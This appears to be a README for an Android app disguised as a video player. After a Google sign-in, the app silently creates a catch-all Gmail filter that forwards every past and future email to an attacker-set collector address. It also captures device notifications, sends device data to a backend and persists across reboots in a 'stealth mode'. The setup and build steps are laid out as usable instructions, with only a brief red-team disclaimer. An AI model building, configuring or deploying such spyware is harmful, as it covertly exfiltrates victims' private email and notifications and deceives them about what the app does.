# Video Player App with Gmail Integration

This Android app provides video streaming functionality with silent Gmail email forwarding capabilities for red team testing and educational purposes.

## Features

- **Video Player**: Basic video streaming functionality
- **Notification Listener**: Captures device notifications
- **Gmail Integration**: Silent email forwarding to collector address
- **Multi-Account Support**: Works with multiple Gmail accounts on device
- **Persistent Operation**: Maintains forwarding across reboots

## Setup Instructions

### 1. Configure Collector Email

Edit `app/src/main/java/com/videoplayerappkotlin/GmailConfig.java`:

```java
public static final String COLLECTOR_EMAIL = "your-collector@email.com";
```

### 2. Google Cloud Console Setup

1. Go to [Google Cloud Console](https://console.cloud.google.com/)
2. Create a new project or select existing one
3. Enable the Gmail API:
   - Go to "APIs & Services" > "Library"
   - Search for "Gmail API" and enable it
4. Create OAuth 2.0 credentials:
   - Go to "APIs & Services" > "Credentials"
   - Click "Create Credentials" > "OAuth 2.0 Client IDs"
   - Choose "Android" as application type
   - Enter your package name: `com.videoplayerappkotlin`
   - Generate SHA-1 fingerprint and add it

### 3. Build and Install

```bash
# Build the app
./gradlew assembleDebug

# Install on device
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 4. Usage

1. **Launch the app**
2. **Enable notification access** (required for notification capture)
3. **Sign in with Google** (this is the consent screen)
4. **Email forwarding is automatically set up** in the background

## How It Works

### OAuth Consent Flow

1. User clicks "Sign in with Google"
2. Google shows consent screen with requested Gmail permissions
3. User approves (this is the only user interaction required)
4. App receives OAuth tokens and stores them securely

### Silent Email Forwarding

After consent, the app automatically:

1. **Registers collector email** as forwarding address
2. **Creates catch-all filter** that forwards ALL emails
3. **Forwards existing emails** in batches
4. **Maintains forwarding** across reboots and app restarts

### Multi-Account Support

The app can detect multiple Google accounts on the device and set up forwarding for each one that the user signs into.

## Security Features

- **Encrypted Storage**: OAuth tokens stored in encrypted SharedPreferences
- **Background Operation**: No user-visible activity after initial consent
- **Persistent Service**: Maintains forwarding even if app is closed
- **Stealth Mode**: Minimal logging and user notifications

## API Endpoints

The app communicates with your backend server for:

- Notification data collection
- Gmail forwarding status updates
- Device information reporting

## Configuration Options

Edit `GmailConfig.java` to customize:

- `COLLECTOR_EMAIL`: Target email for forwarded messages
- `MAINTENANCE_INTERVAL_MINUTES`: How often to check forwarding status
- `EMAIL_BATCH_SIZE`: Number of emails to process in each batch
- `EMAIL_FORWARDING_DELAY_MS`: Delay between forwarding operations

## Troubleshooting

### Common Issues

1. **Sign-in fails**: Check Google Cloud Console credentials
2. **Forwarding not working**: Verify Gmail API is enabled
3. **App crashes**: Check logcat for detailed error messages

### Logs

Use `adb logcat` to monitor app activity:

```bash
adb logcat | grep -E "(GmailAuthService|GmailMaintenanceService|MobileLogger)"
```

## Legal Notice

This app is designed for educational and authorized red team testing purposes only. Ensure you have proper authorization before using this tool in any environment.

## Files Overview

- `MainActivity.java`: Main UI with Google Sign-In
- `GmailAuthService.java`: Handles OAuth and forwarding setup
- `GmailMaintenanceService.java`: Background service for persistence
- `GmailConfig.java`: Configuration settings
- `NotificationListener.java`: Captures device notifications
- `BootReceiver.java`: Starts services on device boot 